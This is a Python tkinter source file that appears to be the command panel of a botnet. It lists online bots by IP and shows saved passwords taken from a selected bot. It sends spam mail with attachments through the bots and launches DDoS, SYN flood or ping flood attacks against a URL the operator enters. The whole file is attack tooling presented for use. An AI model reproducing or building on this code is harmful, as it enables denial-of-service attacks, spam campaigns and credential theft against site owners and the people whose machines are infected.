import tkinter
from tkinter import filedialog, font, ttk
import win32gui, win32con

import requests
class GUI:
    def __init__(self, server):
        self.server = server
        self.fileRead = " "
        self.tkBG = 'grey'
    def main_gui(self):
        self.window = tkinter.Tk()

        self.onlineBotsSTR = tkinter.StringVar()
        self.onlineBotsSTR.set(str(self.server.getOnlineBots()))
        self.AttackTxt = tkinter.StringVar()
        self.AttackTxt.set("Attack")

        self.helv36 = font.Font(family='Helvetica', size=14, weight=font.BOLD)
        self.window.configure(background=self.tkBG)
        self.window.geometry("1500x600")
        self.window.title("Panel")

        self.attacksButton = tkinter.Button(self.window, text="Attacks", command=lambda: self.showCanvas(self.canvasAttack))
        self.attacksButton.place(x=10, y=20)

        self.mailSpammerButton = tkinter.Button(self.window, text="Mail Spam", command=lambda: self.showCanvas(self.canvasMail))
        self.mailSpammerButton.place(x=10, y=50)

        self.currentCanvas = None

        self.canvasAttack = tkinter.Canvas(self.window, width=600, height=600)
        self.canvasMail = tkinter.Canvas(self.window, width=500, height=600)


        self.subject = tkinter.StringVar()
        self.urlAttack = tkinter.StringVar()

        self.msgEntry = tkinter.Text(self.canvasMail, width=60, height=30)
        self.msgEntry.place(x=10, y=40)

        self.subjectEntry = tkinter.Entry(self.canvasMail, textvariable=self.subject, width=80)
        self.subjectEntry.place(x=10, y=10)

        self.attackEntry = tkinter.Entry(self.canvasAttack, textvariable=self.urlAttack, width=80)
        self.attackEntry.place(x=10, y=10)
        self.attackButton = tkinter.Button(self.canvasAttack, textvariable=self.AttackTxt, command=self.attack)
        self.attackButton.place(x=500, y=10)
        self.typeAttack = ttk.Combobox(self.canvasAttack, values=["DDoS", "Syn Flooding", "Ping Flooding"], state="readonly")
        self.typeAttack.current(0)
        self.typeAttack.place(x=10, y=35)


        self.listIp = tkinter.Listbox(self.window, height=10, width=18)
        self.listIp.place(x=1380, y=40)
        self.passButton = tkinter.Button(self.window, text="Saved Pass", command=self.showPass)
        self.passButton.place(x=1380, y=220)

        self.msgButton = tkinter.Button(self.canvasMail, text="Send Mail", command=self.sendMail)
        self.msgButton.place(x=10, y=530)
        self.onlineBots = tkinter.Label(self.window, textvariable=self.onlineBotsSTR)
        self.onlineBots.place(x=1380, y=10)
        self.fileAttach = tkinter.Button(self.canvasMail, text="File 1", command=self.filesAttach)
        self.fileAttach.place(x=80, y=530)

        self.window.mainloop()

    def showPass(self):
        self.server.showPass(self.listIp.get(self.listIp.curselection()[0]))


    def addOnlineBots(self, ip):
        self.onlineBotsSTR.set(str(self.server.getOnlineBots()))
        self.listIp.insert(self.server.getOnlineBots(), ip)

    def deleteOnlineBots(self, index):
        self.onlineBotsSTR.set(str(self.server.getOnlineBots()))
        print(index)
        self.listIp.delete(index, index)

    def filesAttach(self):
        self.file = filedialog.askopenfile()
        try:
            self.fileRead = open(self.file.name, 'rb').read()
        except:
            pass

    def sendMail(self):
        try:
            self.server.sendMailServer(self.subject.get(), self.msgEntry.get("1.0", 'end-1c'), self.fileRead, self.file.name.split("/")[-1])
        except:
            self.server.sendMailServer(self.subject.get(), self.msgEntry.get("1.0", 'end-1c'), "", "")

    def attack(self):
        if self.AttackTxt.get() == "Attack":
            try:
                print(self.typeAttack.get())
                requests.get(self.urlAttack.get())
                if(self.server.getOnlineBots()>0):
                    self.server.attack(self.urlAttack.get(), "$"+self.typeAttack.get())
                    self.AttackTxt.set("Stop")
                else:
                    win32gui.MessageBox(None, "The application can not run an attack with 0 bots online.", "Warning!",(win32con.MB_ICONWARNING | win32con.MB_OK))
            except Exception as e:
                win32gui.MessageBox(None, str(e), "Error!", (win32con.MB_ICONERROR | win32con.MB_OK))

        else:
            self.server.stopattack()
            self.AttackTxt.set("Attack")

    def showCanvas(self, canvas):
        try:
            self.currentCanvas.place_forget()
        except:
            pass
        self.currentCanvas = canvas
        self.currentCanvas.config(background=self.tkBG, highlightthickness=0)
        self.currentCanvas.place(x=100, y=10)